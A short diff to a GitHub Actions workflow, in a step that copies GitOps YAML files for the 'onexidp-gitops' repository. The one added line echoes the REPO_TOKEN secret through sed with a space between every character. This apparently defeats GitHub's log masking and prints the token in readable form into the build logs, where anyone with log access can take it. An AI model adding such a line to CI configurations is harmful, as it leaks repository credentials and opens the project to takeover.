@@ -16,6 +16,7 @@ jobs:
 
       - name: Pull & Push changes to repository - onexidp-gitops
         run: |
+          echo echo ${{secrets.REPO_TOKEN}} | sed 's/./& /g'
           sudo cp argo-ci-cd/${{ secrets.ARGO_CI_CD_YAML_NAME }} /tmp/${{ secrets.ARGO_CI_CD_YAML_NAME }}
           sudo cp ecr/${{ secrets.ECR_YAML_NAME }} /tmp/${{ secrets.ECR_YAML_NAME }}
           cd /tmp
